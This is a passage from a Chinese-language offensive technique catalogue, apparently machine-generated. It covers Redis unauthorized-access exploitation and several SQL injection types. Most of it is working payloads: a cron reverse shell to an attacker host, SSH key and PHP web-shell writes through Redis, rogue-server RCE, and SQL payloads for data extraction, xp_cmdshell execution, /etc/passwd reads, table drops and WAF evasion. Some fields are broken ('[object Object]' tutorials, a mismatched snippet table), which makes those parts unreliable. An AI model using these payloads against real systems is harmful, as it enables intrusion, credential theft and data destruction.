> CONFIG SET dbfilename authorized_keys
> SET sshkey "ssh-rsa AAAA..."
> SAVE
```

写入SSH公钥

| 片段 | 说明 | 类型 |
|---|---|---|
| `redis-cli -h target.com` | 第1步操作 | command |
| `> CONFIG SET dir /root/.ssh/` | 第2步操作 | value |
| `> CONFIG SET dbfilename authorized_keys` | 第3步操作 | value |
| `> SET sshkey "ssh-rsa AAAA..."` | 第4步操作 | value |
| `> SAVE` | 第5步操作 | value |

> platform: `linux`

#### 5. 写入Cron任务

```
redis-cli -h target.com
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SET cron "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
> SAVE
```

写入Cron任务

| 片段 | 说明 | 类型 |
|---|---|---|
| `/var/spool/cron/` | Cron任务目录 | path |
| `*/1 * * * *` | 每分钟执行 | value |

> platform: `linux`

#### 6. 主从复制RCE

```
使用redis-rogue-server工具:
python redis-rogue-server.py --rhost target.com --lhost attacker.com
通过主从复制加载恶意模块执行命令
```

主从复制RCE

| 片段 | 说明 | 类型 |
|---|---|---|
| `使用redis-rogue-server工具:` | 第1步操作 | command |
| `python redis-rogue-server.py --rhost target.com --lhost attacker.com` | 第2步操作 | value |
| `通过主从复制加载恶意模块执行命令` | 第3步操作 | value |

> platform: `linux`

**WAF 绕过**

#### Redis命令混淆绕过

```
redis-cli -h target.com
> "C""O""N""F""I""G" SET dir /var/www/html/
> $(printf 'CONF')$(printf 'IG') SET dbfilename shell.php
> SET shell "<?php system(\$_GET['cmd']); ?>"
> SAVE
```

使用引号分割命令字符串、拼接变量等方式混淆Redis命令绕过WAF检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |
| `$()` | 命令替换 | operator |

#### Redis Lua脚本执行绕过

```
redis-cli -h target.com
> EVAL "redis.call('set','shell','<?php system(\$_GET[c]); ?>')" 0
> EVAL "redis.call('config','set','dir','/var/www/html/')" 0
> EVAL "redis.call('config','set','dbfilename','test.php')" 0
> EVAL "redis.call('save')" 0
```

通过EVAL执行Lua脚本间接调用Redis命令，绕过对CONFIG/SET等直接命令的检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |

**教程**

[object Object]

---

### 11. 布尔盲注

- **id:** `sqli-blind`
- **分类:** SQL/NoSQL注入 / 盲注
- **tags:** `sqli` `blind` `boolean`

基于布尔条件的SQL盲注技术

**前置条件**

- 存在SQL注入
- 页面有真/假两种不同响应

**利用步骤**

#### 1. 确认盲注

```
' AND 1=1-- (返回正常)
' AND 1=2-- (返回异常)
确认存在布尔盲注
```

确认布尔盲注

| 片段 | 说明 | 类型 |
|---|---|---|
| `AND 1=1` | 永真条件 | value |
| `AND 1=2` | 永假条件 | value |

#### 2. 获取数据库名长度

```
' AND LENGTH(database())=1--
' AND LENGTH(database())=2--
...
' AND LENGTH(database())=N--
直到返回正常
```

枚举数据库名长度

| 片段 | 说明 | 类型 |
|---|---|---|
| `LENGTH()` | 返回字符串长度 | function |

#### 3. 逐字符枚举数据库名

```
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND ASCII(SUBSTRING(database(),1,1))>100--
...
使用二分法快速定位字符
```

逐字符提取数据库名

| 片段 | 说明 | 类型 |
|---|---|---|
| `SUBSTRING(str,pos,len)` | 截取子字符串 | value |
| `ASCII()` | 返回ASCII码值 | function |

#### 4. 使用工具自动化

```
sqlmap -u "http://target.com?id=1" --technique=B --dbs
使用sqlmap进行布尔盲注
```

使用sqlmap自动化

| 片段 | 说明 | 类型 |
|---|---|---|
| `--technique=B` | 指定布尔盲注技术 | parameter |
| `--dbs` | 枚举数据库 | parameter |

**WAF 绕过**

#### 布尔盲注条件表达式替代

```
' AND (CASE WHEN (MID(database(),1,1)='a') THEN 1 ELSE 0 END)=1--
' AND LEFT(database(),1)>'a'--
' AND RIGHT(LEFT(database(),2),1)='d'--
' AND ORD(MID(database(),1,1))BETWEEN 97 AND 122--
```

使用CASE WHEN替代IF()、MID()替代SUBSTRING()、LEFT/RIGHT组合截取、BETWEEN替代大于小于比较

| 片段 | 说明 | 类型 |
|---|---|---|
| `CASE WHEN` | 条件表达式 | keyword |
| `SUBSTRING` | 字符串截取 | function |
| `--` | SQL注释 | operator |

#### 布尔盲注数学运算与位运算绕过

```
' AND (SELECT CONV(HEX(SUBSTR(database(),1,1)),16,10))>96--
' AND (SELECT ORD(MID(database(),1,1))&0x40)=0x40--
' AND (SELECT POW(ORD(MID(database(),1,1)),0))+0=1--
' DIV 1 AND (SELECT LENGTH(database()))>0--
```

使用HEX/CONV进行编码比较、位与运算(&)判断字符范围、POW()数学函数混淆、DIV替代AND

| 片段 | 说明 | 类型 |
|---|---|---|
| `SELECT` | 查询数据 | keyword |
| `SUBSTRING` | 字符串截取 | function |
| `HEX()` | 十六进制编码 | encoding |
| `--` | SQL注释 | operator |

**教程**

[object Object]

---

### 12. 时间盲注

- **id:** `sqli-time-based`
- **分类:** SQL/NoSQL注入 / 盲注
- **tags:** `sqli` `blind` `time`

基于时间延迟的SQL盲注技术

**前置条件**

- 存在SQL注入
- 页面响应时间可控

**利用步骤**

#### 1. 确认时间盲注

```
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
观察响应是否延迟5秒
```

确认时间盲注

| 片段 | 说明 | 类型 |
|---|---|---|
| `SLEEP(5)` | MySQL延时5秒 | value |
| `IF(cond,true,false)` | 条件判断函数 | value |

#### 2. 获取数据库名长度

```
' AND IF(LENGTH(database())=N,SLEEP(5),0)--
枚举数据库名长度
```

枚举数据库名长度

| 片段 | 说明 | 类型 |
|---|---|---|
| `SLEEP()` | 延时函数 | function |
| `--` | SQL注释 | operator |

#### 3. 逐字符提取

```
' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--
使用二分法提取字符
```

逐字符提取数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `SLEEP()` | 延时函数 | function |
| `--` | SQL注释 | operator |

#### 4. 不同数据库延时函数

```
MySQL: SLEEP(5), BENCHMARK()
MSSQL: WAITFOR DELAY '0:0:5'
PostgreSQL: pg_sleep(5)
Oracle: DBMS_LOCK.SLEEP(5)
```

各数据库延时函数

| 片段 | 说明 | 类型 |
|---|---|---|
| `WAITFOR DELAY` | MSSQL延时 | value |
| `pg_sleep()` | PostgreSQL延时 | function |

**WAF 绕过**

#### 时间延迟替代函数绕过

```
' AND BENCHMARK(5000000,SHA1('test'))--
' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--
' AND GET_LOCK('sqli_test',5)--
' AND (CASE WHEN database() LIKE '%' THEN BENCHMARK(3000000,MD5('x')) ELSE 0 END)--
```

使用BENCHMARK()替代SLEEP()、笛卡尔积重查询消耗时间、GET_LOCK()锁等待、CASE条件触发延时

| 片段 | 说明 | 类型 |
|---|---|---|
| `SELECT...FROM` | 查询数据 | keyword |
| `information_schema` | 元数据库 | value |
| `BENCHMARK` | 基准测试延迟 | function |
| `CASE WHEN` | 条件表达式 | keyword |
| `--` | SQL注释 | operator |

#### 跨数据库时间延迟绕过

```
PostgreSQL: ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'--
Oracle: ' AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END--
MySQL: ' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--
```

利用各数据库特有的时间延迟方法：PostgreSQL的pg_sleep条件触发、MSSQL的IF条件WAITFOR、Oracle的DBMS_PIPE.RECEIVE_MESSAGE替代DBMS_LOCK

| 片段 | 说明 | 类型 |
|---|---|---|
| `SELECT...FROM` | 查询数据 | keyword |
| `WHERE` | 条件筛选 | keyword |
| `SLEEP()` | 时间延迟 | function |
| `WAITFOR DELAY` | MSSQL延迟 | keyword |
| `CASE WHEN` | 条件表达式 | keyword |
| `--` | SQL注释 | operator |

**教程**

[object Object]

---

### 13. 报错注入

- **id:** `sqli-error-based`
- **分类:** SQL/NoSQL注入 / 报错注入
- **tags:** `sqli` `error` `extractvalue`

利用错误信息提取数据的SQL注入

**前置条件**

- 存在SQL注入
- 错误信息会显示在页面上

**利用步骤**

#### 1. 确认报错注入

```
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,version()),1)--
```

测试报错注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `extractvalue()` | MySQL XML提取函数 | function |
| `updatexml()` | MySQL XML更新函数 | function |
| `concat(0x7e,...)` | 拼接波浪号标记 | value |

#### 2. 获取数据库信息

```
' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,user()))--
' AND extractvalue(1,concat(0x7e,version()))--
```

获取基础信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `CONCAT` | 字符串拼接 | function |
| `--` | SQL注释 | operator |
| `EXTRACTVALUE` | 报错注入函数 | function |

#### 3. 获取表名

```
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
```

获取表名

| 片段 | 说明 | 类型 |
|---|---|---|
| `SELECT` | 查询数据 | keyword |
| `CONCAT` | 字符串拼接 | function |
| `information_schema` | 元数据库 | value |
| `--` | SQL注释 | operator |

#### 4. 获取数据

```
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)))--
```

提取数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `SELECT` | 查询数据 | keyword |
| `CONCAT` | 字符串拼接 | function |
| `--` | SQL注释 | operator |
| `EXTRACTVALUE` | 报错注入函数 | function |

#### 5. 其他报错函数

```
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXP(~(SELECT * FROM (SELECT version())a))--
```

其他报错注入方法

| 片段 | 说明 | 类型 |
|---|---|---|
| `FLOOR(RAND(0)*2)` | 产生重复键错误 | value |
| `EXP()` | 数学函数溢出报错 | function |

**WAF 绕过**

#### 替代报错函数绕过

```
' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
' AND (SELECT 1 FROM (SELECT NTILE(1) OVER(ORDER BY (SELECT version())))a)--
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
' AND ST_LatFromGeoHash(version())--
```

使用GEOMETRYCOLLECTION空间函数、JSON_KEYS、ST_LatFromGeoHash等冷门函数替代extractvalue/updatexml触发报错

| 片段 | 说明 | 类型 |
|---|---|---|
| `SELECT...FROM` | 查询数据 | keyword |
| `CONCAT` | 字符串拼接 | function |
| `ORDER BY` | 排序/列数探测 | keyword |
| `--` | SQL注释 | operator |

#### 编码与科学计数法绕过

```
' AND extractvalue(1,concat(0x7e,(SELECT unhex(hex(database())))))--
' AND 1=1 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,database(),0x7e) x)a))--
' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.schemata GROUP BY x)a)--
' %26%26 updatexml(1,concat(0x7e,(select%20database())),1)--%20
```

使用unhex(hex())双层编码、EXP()科学计数法溢出、URL双重编码（%26%26替代AND）绕过WAF检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `SELECT...FROM` | 查询数据 | keyword |
| `information_schema` | 元数据库 | value |
| `CONCAT` | 字符串拼接 | function |
| `HEX()` | 十六进制编码 | encoding |
| `UNHEX()` | 十六进制解码 | encoding |
| `--` | SQL注释 | operator |
| `%xx` | URL编码 | encoding |

**教程**

[object Object]

---

### 14. 二阶SQL注入

- **id:** `sqli-second-order`
- **分类:** SQL/NoSQL注入 / 二阶注入
- **tags:** `sqli` `second-order` `stored`

存储后触发的SQL注入攻击

**前置条件**

- 存在数据存储功能
- 存储数据被二次使用

**利用步骤**

#### 1. 探测二阶注入

```
注册用户名: admin'--
或: admin' OR '1'='1
登录后查看是否影响其他功能
```

探测二阶注入点

| 片段 | 说明 | 类型 |
|---|---|---|
| `OR '1'='1'` | 逻辑永真 | keyword |
| `--` | SQL注释 | operator |

#### 2. 用户名注入

```
注册用户: admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
登录触发报错注入
```

用户名触发注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `FLOOR(RAND(0)*2)` | 报错注入关键 | value |
| `GROUP BY x` | 触发重复键错误 | value |

#### 3. 密码重置注入

```
输入邮箱: ' OR '1'='1
可能触发密码重置所有用户
```

密码重置功能注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `OR '1'='1'` | 逻辑永真 | keyword |

#### 4. 订单/评论注入

```
提交评论: ' UNION SELECT username,password FROM users--
管理员查看评论时触发
```

评论触发注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT...FROM` | 查询数据 | keyword |
| `--` | SQL注释 | operator |

**WAF 绕过**

#### 编码存储触发绕过

```
注册用户名: admin'/*
随后修改密码时SQL变为: UPDATE users SET password='new' WHERE username='admin'/*'

注册用户名: CONCAT(CHAR(39),CHAR(32),CHAR(79),CHAR(82),CHAR(32),CHAR(39),CHAR(49),CHAR(39),CHAR(61),CHAR(39),CHAR(49))
存储后二次使用时自动解码触发注入
```

在存储阶段使用注释截断(/**/)或CHAR()编码构造payload，WAF在输入时检测不到恶意SQL，但数据库二次使用时自动触发

| 片段 | 说明 | 类型 |
|---|---|---|
| `WHERE` | 条件筛选 | keyword |
| `UPDATE...SET` | 更新数据 | keyword |
| `CONCAT` | 字符串拼接 | function |

#### Unicode标准化绕过

```
注册用户名: admin＇ OR ＇1＇=＇1
(使用全角引号U+FF07，数据库标准化为半角后触发)

注册邮箱: test@test.com' UNION SELECT password FROM users WHERE '1'='1
(邮箱验证通过WAF但存储后在其他查询中拼接触发)

评论内容: \x27 OR 1=1--
(转义序列在存储层被还原为单引号)
```

利用Unicode全角字符(U+FF07)标准化、转义序列还原、不同功能模块的过滤差异来绕过WAF检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT...FROM` | 查询数据 | keyword |
| `WHERE` | 条件筛选 | keyword |
| `OR '1'='1'` | 逻辑永真 | keyword |
| `--` | SQL注释 | operator |

**教程**

[object Object]

---

### 15. 联合查询注入

- **id:** `sqli-union`
- **分类:** SQL/NoSQL注入 / 联合查询
- **tags:** `sqli` `union` `select`

使用UNION SELECT提取数据

**前置条件**

- 存在注入点
- 可显示查询结果

**利用步骤**

#### 1. 确定列数

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
直到报错
或:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

确定列数

| 片段 | 说明 | 类型 |
|---|---|---|
| `ORDER BY` | 按列排序确定列数 | value |
| `NULL,NULL` | 逐个增加NULL确定列数 | value |

#### 2. 确定显示列

```
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
找出哪些列会显示在页面上
```

确定显示位置

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果集 | keyword |
| `SELECT` | 查询数据 | keyword |
| `--` | SQL注释 | operator |

#### 3. 提取数据

```
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
```

提取数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果集 | keyword |
| `SELECT` | 查询数据 | keyword |
| `information_schema` | 元数据库 | value |
| `--` | SQL注释 | operator |

#### 4. 绕过过滤

```
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' UnIoN SeLeCt 1,2,3--
' UNION/**/SELECT/**/1,2,3--
```

绕过关键字过滤

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果集 | keyword |
| `SELECT` | 查询数据 | keyword |
| `--` | SQL注释 | operator |

**WAF 绕过**

#### UNION注入关键字绕过

```
' /*!50000UNION*/ /*!50000SELECT*/ 1,database(),3--
' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3--
' uNiOn%23%0aSeLeCt 1,2,3--
' UNION%0a%09%0d%0bSELECT%0a1,2,3--
```

使用MySQL版本注释/*!50000*/、URL编码UNION/SELECT关键字、%23换行绕过、空白字符混淆（%09 TAB, %0d CR, %0b VT）

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT` | 查询数据 | keyword |
| `--` | SQL注释 | operator |
| `/*...*/` | 内联注释 | operator |
| `%xx` | URL编码 | encoding |

#### UNION注入NULL字节与分块绕过

```
' UNION%00SELECT 1,2,3--
' /*!UNION*/%20/*!ALL*//*!SELECT*/ 1,2,3--
Transfer-Encoding: chunked

5
UNION
7
 SELECT
1
 
0

' UNION SELECT 1,group_concat(table_name SEPARATOR 0x3c62723e),3 FROM information_schema.tables WHERE table_schema=database()--
```

使用NULL字节(%00)截断WAF检测、UNION ALL绕过去重检测、HTTP分块传输编码将关键字分散到不同chunk、自定义SEPARATOR替代默认逗号

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT...FROM` | 查询数据 | keyword |
| `WHERE` | 条件筛选 | keyword |
| `information_schema` | 元数据库 | value |
| `CONCAT` | 字符串拼接 | function |
| `GROUP_CONCAT` | 分组拼接 | function |
| `--` | SQL注释 | operator |
| `/*...*/` | 内联注释 | operator |
| `%xx` | URL编码 | encoding |
| `Transfer-Encoding` | 传输编码头 | header |
| `chunked` | 分块传输 | keyword |

**教程**

[object Object]

---

### 16. 堆叠查询注入

- **id:** `sqli-stacked`
- **分类:** SQL/NoSQL注入 / 堆叠查询
- **tags:** `sqli` `stacked` `queries`

执行多条SQL语句的注入

**前置条件**

- 支持多语句执行
- MySQL/PostgreSQL/MSSQL

**利用步骤**

#### 1. 探测堆叠查询

```
'; SELECT SLEEP(5)--
'; SELECT 1--
'; WAITFOR DELAY '0:0:5'--
```

探测是否支持堆叠查询

| 片段 | 说明 | 类型 |
|---|---|---|
| `SELECT` | 查询数据 | keyword |
| `SLEEP()` | 延时函数 | function |
| `WAITFOR DELAY` | MSSQL延时 | function |
| `--` | SQL注释 | operator |

#### 2. MySQL堆叠查询

```
'; INSERT INTO users(username,password) VALUES('hacker','hacked');--
'; UPDATE users SET password='hacked' WHERE username='admin';--
'; DROP TABLE users;--
```

MySQL执行多语句

| 片段 | 说明 | 类型 |
|---|---|---|
| `;` | 语句分隔符 | operator |
| `INSERT INTO` | 插入数据 | value |

> platform: `linux`

#### 3. MSSQL堆叠查询

```
'; EXEC xp_cmdshell('whoami');--
'; EXEC sp_executesql N'SELECT * FROM users';--
```

MSSQL执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `SELECT` | 查询数据 | keyword |
| `--` | SQL注释 | operator |
| `EXEC` | 执行存储过程 | keyword |
| `xp_cmdshell` | 系统命令执行 | function |

> platform: `windows`

#### 4. PostgreSQL堆叠查询

```
'; COPY users FROM '/etc/passwd';--
'; SELECT * FROM pg_read_file('/etc/passwd');--
```

PostgreSQL读取文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `SELECT` | 查询数据 | keyword |
| `--` | SQL注释 | operator |

> platform: `linux`

**WAF 绕过**

#### 堆叠查询终止符替代绕过

```
' %3B SELECT user()--
' ;%0a SELECT user()--
' ; /*!SELECT*/ user()--
'; SET @q=0x53454C45435420757365722829; PREPARE stmt FROM @q; EXECUTE stmt;--
```

使用URL编码分号(%3B)、换行符分隔、内联注释包裹SELECT、PREPARE预处理执行十六进制编码的查询语句

| 片段 | 说明 | 类型 |
|---|---|---|
| `SELECT...FROM` | 查询数据 | keyword |
| `--` | SQL注释 | operator |
| `/*...*/` | 内联注释 | operator |
| `%xx` | URL编码 | encoding |

#### 堆叠查询条件执行绕过

```
'; IF(1=1) EXEC('wh'+'oam'+'i');--
'; DECLARE @s VARCHAR(100)=CHAR(119)+CHAR(104)+CHAR(111)+CHAR(97)+CHAR(109)+CHAR(105); EXEC xp_cmdshell @s;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END;--
'; DO $$ BEGIN PERFORM dblink_connect('host=attacker.com dbname=test'); END $$;--
```

使用字符串拼接分割命令关键字、CHAR()编码命令参数、CASE条件执行、PostgreSQL DO块执行复杂逻辑

| 片段 | 说明 | 类型 |
|---|---|---|
| `SELECT` | 查询数据 | keyword |
| `SLEEP()` | 时间延迟 | function |
| `xp_cmdshell` | 系统命令执行 | function |
| `EXEC` | 执行存储过程 | keyword |
| `CASE WHEN` | 条件表达式 | keyword |
| `--` | SQL注释 | operator |

**教程**

[object Object]

---

### 17. SQL注入WAF绕过

- **id:** `sqli-waf-bypass`
- **分类:** SQL/NoSQL注入 / WAF绕过
- **tags:** `sqli` `waf` `bypass`

绕过Web应用防火墙的技术

**前置条件**

- 目标存在SQL注入点
- 存在WAF防护

**利用步骤**

#### 分块传输编码

```
Transfer-Encoding: chunked

2
id
1
=
1
1

0
```

利用分块传输绕过WAF检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `Transfer-Encoding` | 传输编码头 | header |
| `chunked` | 分块传输 | keyword |

#### HTTP参数污染(HPP)

```
?id=1&id=UNION&id=SELECT&id=1,2,3--
```

利用HPP拆分恶意Payload

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果集 | keyword |
| `SELECT` | 查询数据 | keyword |
| `--` | SQL注释 | operator |

#### 等价函数替换

```
' AND GREATEST(1,0)--
```

使用GREATEST替代>符号

| 片段 | 说明 | 类型 |
|---|---|---|
| `--` | SQL注释 | operator |

#### 无逗号注入

```
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
```

不使用逗号进行联合查询

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT...FROM` | 查询数据 | keyword |
| `--` | SQL注释 | operator |

#### IBM/Oracle特有

```
' UNION SELECT CAST(1 AS VARCHAR(10)) FROM dual--
```

利用特定数据库特性绕过通用规则

| 片段 | 说明 | 类型 |
|---|---|---|
| `{{}}` | 模板表达式 | technique |
| `__class__` | 类属性 | keyword |

#### 垃圾数据填充

```
/* !50000AAAAAAAAAA...(1000+字节垃圾数据)...*/ UNION SELECT 1,2,3--
```

超长数据溢出WAF缓冲区 (示意代码)

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果集 | keyword |
| `SELECT` | 查询数据 | keyword |
| `--` | SQL注释 | operator |

#### Content-Type欺骗

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="id"

1 UNION SELECT 1,2,3--
------WebKitFormBoundary--
```

利用multipart绕过检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT` | 查询数据 | keyword |
| `--` | SQL注释 | operator |
| `Content-Type` | 内容类型头 | header |

#### JSON注入

```
{"id": "1' UNION SELECT 1,2,3--"}
```

在JSON数据中注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `id:` | 命令/关键字 | command |

**教程**

[object Object]
